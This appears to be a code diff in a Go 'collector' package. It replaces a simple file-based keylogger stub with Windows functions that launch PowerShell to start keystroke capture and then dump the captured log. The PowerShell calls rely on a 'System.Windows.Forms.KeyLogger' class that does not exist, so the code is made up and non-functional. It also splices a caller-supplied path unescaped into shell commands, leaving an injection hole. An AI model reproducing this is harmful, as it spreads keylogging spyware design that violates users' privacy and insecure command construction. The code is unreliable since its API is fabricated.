@@ -1,34 +1,34 @@
+//go:build windows
+
 package collector
 
 import (
-"os"
-"time"
+"os/exec"
 )
 
-type Keylogger struct {
-LogFile string
-}
-
-func NewKeylogger() *Keylogger {
-return &Keylogger{
-LogFile: "keylog_" + time.Now().Format("20060102_150405") + ".txt",
-}
-}
-
-func (k *Keylogger) Start() error {
-return os.WriteFile(k.LogFile, []byte("Keylogger started\n"), 0644)
-}
-
-func (k *Keylogger) LogKey(key string) error {
-f, err := os.OpenFile(k.LogFile, os.O_APPEND|os.O_WRONLY, 0644)
+func CaptureKeylogs(outputPath string) bool {
+cmd := exec.Command("cmd", "/c", "powershell -Command \"$path = '"+outputPath+"'; $listener = New-Object System.Windows.Forms.KeyLogger; $listener.Start()\"")
+err := cmd.Run()
 if err != nil {
-return err
+return false
 }
-defer f.Close()
-_, err = f.WriteString(key)
-return err
+return true
 }
 
-func (k *Keylogger) Stop() error {
-return os.WriteFile(k.LogFile, []byte("\nKeylogger stopped\n"), 0644)
+func CaptureKeylogsWithHook() bool {
+cmd := exec.Command("cmd", "/c", "powershell -Command \"$listener = New-Object System.Windows.Forms.KeyLogger; $listener.Start()\"")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
+}
+
+func DumpKeylog(outputPath string) string {
+cmd := exec.Command("cmd", "/c", "type "+outputPath)
+output, err := cmd.Output()
+if err != nil {
+return ""
+}
+return string(output)
 }
